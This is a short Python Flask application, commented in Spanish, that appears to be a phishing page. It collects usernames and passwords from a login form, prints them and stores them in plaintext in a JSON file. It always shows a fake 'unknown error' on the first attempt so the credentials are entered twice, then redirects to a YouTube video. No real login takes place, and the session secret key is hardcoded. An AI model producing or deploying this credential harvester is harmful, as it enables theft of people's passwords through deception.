import json
import os
from flask import Flask, request, render_template, redirect, session, url_for

app = Flask(__name__)
app.secret_key = "clave_secreta"  # Necesario para manejar sesiones
JSON_FILE = "datos.json"  # Archivo donde se guardarán los datos


# Crear el archivo JSON si no existe
if not os.path.exists(JSON_FILE):
    with open(JSON_FILE, "w") as archivo:
        json.dump([], archivo)  # Inicializa con una lista vacía


# Función para guardar datos en JSON
def guardar_datos(usuario, contraseña):
    try:
        with open(JSON_FILE, "r") as archivo:
            datos = json.load(archivo)  # Leer el contenido existente
    except (FileNotFoundError, json.JSONDecodeError):
        datos = []  # Si el archivo no existe o está vacío, crear una lista vacía

    datos.append({"usuario": usuario, "contraseña": contraseña})  # Agregar nuevo dato

    with open(JSON_FILE, "w") as archivo:
        json.dump(datos, archivo, indent=4)  # Guardar en el JSON con formato legible


# Ruta para mostrar el formulario
@app.route('/')
def index():
    return render_template('index.html', mensaje="")  # Página de inicio sin mensaje


# Ruta para recibir los datos del formulario
@app.route('/login', methods=['POST'])
def recibir_datos():
    usuario = request.form.get('usuario')
    contraseña = request.form.get('contraseña')

    print(f"Usuario recibido: {usuario}")
    print(f"Contraseña recibida: {contraseña}")

    guardar_datos(usuario, contraseña)  # Guardar en el archivo JSON

    # Si es el primer intento, mostrar error y guardar en sesión
    if "intento_fallido" not in session:
        session["intento_fallido"] = True
        return render_template('index.html', mensaje="Error desconocido. Intenta de nuevo.")

    # Si ya intentó antes, permitir el acceso
    return redirect(url_for('pagina_segura'))


@app.route('/pagina_segura')
def pagina_segura():
    return redirect("https://www.youtube.com/watch?v=Q5cN9gR8a4g")



